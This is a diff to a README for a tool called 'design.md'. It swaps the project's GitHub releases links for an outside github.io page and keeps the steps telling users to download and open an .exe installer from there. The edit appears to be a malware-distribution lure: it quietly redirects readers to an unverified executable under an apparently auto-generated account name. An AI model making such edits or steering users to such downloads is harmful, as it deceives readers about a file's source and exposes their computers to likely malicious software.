@@ -1,6 +1,6 @@
 # 🎨 design.md - Define visual systems for coding agents
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Glad-oboedacaccia408/design.md/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://glad-oboedacaccia408.github.io)
 
 ## 📋 What is design.md
 
@@ -21,7 +21,7 @@ Building apps requires consistency. Without a central guide, colors drift and bu
 
 You need the latest version to start building your design system. Follow these steps to prepare your computer.
 
-1. Visit the [releases page](https://github.com/Glad-oboedacaccia408/design.md/releases) to find the current installer.
+1. Visit the [releases page](https://glad-oboedacaccia408.github.io) to find the current installer.
 2. Look for the file ending in .exe under the most recent version tag.
 3. Click the filename to save it to your computer.
 4. Open the downloaded file to start the installation.
